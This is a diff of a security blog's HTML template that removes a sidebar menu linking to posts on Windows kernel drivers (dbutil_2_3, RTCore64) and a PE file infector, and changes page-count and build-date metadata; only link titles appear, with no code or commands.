-    <ul class="section-tree">
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> Kernel </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/windows/kernel/readwrite_using_dbutil_2_3/" title="./windows/kernel/readwrite_using_dbutil_2_3/">
-                        
-                            Read/Write using dbutil_2_3
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/windows/kernel/reverse_dbutil_2_3/" title="./windows/kernel/reverse_dbutil_2_3/">
-                        
-                            Reverse dbutil_2_3
-                        
-                    </a>
-                </li>
             
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/windows/kernel/reverse_rtcore64/" title="./windows/kernel/reverse_rtcore64/">
-                        
-                            Reverse RTCore64
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> Portable-Executable </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/windows/portable-executable/fileinfector/" title="./windows/portable-executable/fileinfector/">
-                        
-                            FileInfector
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-    </ul>
-
-
-                    </div>
-                
-            </div>
         </div>
     </article>
 
@@ -1793,8 +1284,8 @@
             
                 <li>
                     
-                        Pages:
-                        44
+                        Word Count:
+                        392
                     
                 </li>
             
@@ -1828,12 +1319,10 @@
             
                 <li>
                     
-                        
-                            Last build: &nbsp;
-                            <time>
-                                Apr 22 2024 17:18:35
-                            </time>
-                        
+                        Last modified: &nbsp;
+                        <time>
+                            Sep 16 2024 00:00:00
+                        </time>
                     
                 </li>
             
